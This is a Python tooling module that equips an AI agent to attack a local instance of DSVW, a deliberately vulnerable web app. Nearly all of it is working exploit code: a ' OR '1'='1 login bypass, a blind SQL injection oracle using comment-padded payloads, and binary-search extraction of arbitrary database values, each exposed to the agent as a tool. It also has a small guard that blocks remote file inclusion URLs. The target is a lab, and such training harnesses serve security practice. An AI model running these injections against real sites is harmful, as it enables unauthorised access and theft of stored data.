"""DSVW training-target tooling for the Imperial agent.
Target: http://127.0.0.1:65412  (local lab only)
"""
import re, requests, urllib.parse

BASE = "http://127.0.0.1:65412/"

_META_COOKIE = re.compile(
    r'<meta\s+http-equiv=["\']?Set-Cookie["\']?\s+content=["\']([^"\']+)["\']',
    re.I,
)

def parse_meta_cookie(html):
    m = _META_COOKIE.search(html)
    if not m: return None
    pair = m.group(1).split(";", 1)[0]
    name, _, value = pair.partition("=")
    return name.strip(), value.strip()

def make_oracle(session):
    """TRUE/FALSE oracle targeting /login SQLi.
    urllib.parse.quote forces %20 for spaces; DSVW does not decode '+'."""
    def probe(cond):
        payload = f"'/**/OR/**/({cond})--"
        url = (BASE + "login?username=admin&password="
               + urllib.parse.quote(payload, safe=""))
        return session.get(url, timeout=5).text

    true_txt, false_txt = probe("1=1"), probe("1=2")
    if true_txt == false_txt:
        raise RuntimeError("oracle cannot distinguish TRUE/FALSE")

    def dist(a, b):
        return abs(len(a) - len(b)) + sum(x != y for x, y in zip(a, b))

    def is_true(cond):
        txt = probe(cond)
        return dist(txt, true_txt) < dist(txt, false_txt)

    if not is_true("1=1") or is_true("1=2"):
        raise RuntimeError("oracle unstable")
    return is_true


def extract_char(is_true, expr, pos, lo=1, hi=127):
    if not is_true("unicode(substr((%s),%d,1))>%d" % (expr, pos, lo - 1)):
        return None
    while lo < hi:
        mid = (lo + hi) // 2
        if is_true("unicode(substr((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def extract_string(is_true, expr, max_len=128):
    out = []
    for i in range(1, max_len + 1):
        c = extract_char(is_true, expr, i)
        if c is None: break
        out.append(c)
    return "".join(out)

class DSVWTools:
    def __init__(self, base=BASE):
        self.base = base
        self.s = requests.Session()
        self._oracle = None
    def _ensure(self):
        if self._oracle is None:
            self._oracle = make_oracle(self.s)
        return self._oracle
    def http_get(self, path, params=None):
        # guard:http_get-v2
        if params and "include" in params and "://" in str(params["include"]):
            return "[blocked] include= with URL scheme is RFI; external fetch disabled in this lab. Use a local path."
        return self.s.get(self.base.rstrip("/") + path, params=params, timeout=5).text
    def login(self, username="admin", password="' OR '1'='1"):
        r = self.s.get(self.base + "login", params={"username": username, "password": password}, timeout=5)
        c = parse_meta_cookie(r.text)
        if c:
            self.s.cookies.set(*c)
            return "login OK, SESSIONID=%s" % c[1]
        return "login failed"
    def sqli_probe(self, condition):
        return str(self._ensure()(condition))
    def sqli_extract(self, expression, max_len=128):
        return extract_string(self._ensure(), expression, max_len)

_INSTANCE = DSVWTools()

TOOL_SCHEMAS = [
    {"name": "dsvw_http_get", "description": "GET a path on the local DSVW training target (127.0.0.1:65412).",
     "input_schema": {"type": "object", "properties": {"path": {"type": "string"}, "params": {"type": "object"}}, "required": ["path"]}},
    {"name": "dsvw_login", "description": "Authenticate to local DSVW (handles meta Set-Cookie).",
     "input_schema": {"type": "object", "properties": {"username": {"type": "string"}, "password": {"type": "string"}}}},
    {"name": "dsvw_sqli_probe", "description": "Boolean blind SQLi oracle against local DSVW.",
     "input_schema": {"type": "object", "properties": {"condition": {"type": "string"}}, "required": ["condition"]}},
    {"name": "dsvw_sqli_extract", "description": "Extract a SQL expression char-by-char via blind SQLi.",
     "input_schema": {"type": "object", "properties": {"expression": {"type": "string"}, "max_len": {"type": "integer"}}, "required": ["expression"]}},
]
TOOL_NAMES = {s["name"] for s in TOOL_SCHEMAS}

def dispatch(name, inp):
    if name == "dsvw_http_get":       return _INSTANCE.http_get(inp["path"], inp.get("params"))
    if name == "dsvw_login":          return _INSTANCE.login(inp.get("username", "admin"), inp.get("password", "' OR '1'='1"))
    if name == "dsvw_sqli_probe":     return _INSTANCE.sqli_probe(inp["condition"])
    if name == "dsvw_sqli_extract":   return _INSTANCE.sqli_extract(inp["expression"], inp.get("max_len", 128))
    return "Unknown dsvw tool: %s" % name
